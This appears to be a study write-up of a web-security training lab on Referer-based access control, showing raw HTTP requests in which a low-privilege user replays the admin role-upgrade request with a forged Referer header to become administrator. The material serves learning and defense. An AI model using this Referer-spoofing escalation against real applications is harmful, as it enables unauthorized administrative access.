---
tags:
  - authz
---
# Referer-based access control

## Instructions

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

Start off by logging in as the administrator to get familiar with the admin panel.

Note that when we access the /admin endpoint, the referer header shows that we're coming from the administrator's account page. 

```text title="Accessing the admin panel" hl_lines="8"
GET /admin HTTP/1.1
Host: 0a800032034584dc80b1f30b00460008.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/my-account?id=administrator
Cookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: green
Priority: u=0, i


```

Also note that when we try to access the /admin endpoint while logged in as wiener, we get a 401 status code. 

![](attachments/authz-lab-13/file-20251124113610516.png)

Changing the URL here didn't work, so looking back at the request to upgrade a user, we see that the referer header indicates coming from the /admin endpoint itself. 

```text title="Upgrading a user" hl_lines="8"
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0a800032034584dc80b1f30b00460008.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin
Cookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: green
Priority: u=0, i


```

If we plug that URL in while logged in as wiener, then we're able to upgrade ourselves to an admin and solve the lab. 

```text title="Solving the lab" hl_lines="7 9"
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: 0a800032034584dc80b1f30b00460008.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin
Connection: keep-alive
Cookie: session=zkw8pJY9jw6amiU95SsxlSDqndiZNdml
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: green
Priority: u=0, i


```

